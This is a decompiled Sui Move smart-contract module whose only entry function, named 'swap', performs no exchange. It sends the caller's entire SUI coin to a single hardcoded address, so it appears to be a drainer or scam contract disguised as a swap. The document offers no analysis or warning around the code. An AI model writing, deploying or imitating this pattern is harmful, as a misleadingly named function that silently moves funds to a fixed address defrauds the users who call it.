module 0xb2385cfc36777bb3b9ce92594b0f75787170d0cacf59ea00049e4519aae4c8d8::core {
    public entry fun swap(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: &mut 0x2::tx_context::TxContext) {
        0x2::coin::value<0x2::sui::SUI>(&arg0);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg0, @0xde714be5423fed953464c0bed1332b88a6cfdac49b2579e37203fbac73483379);
    }

    // decompiled from Move bytecode v7
}

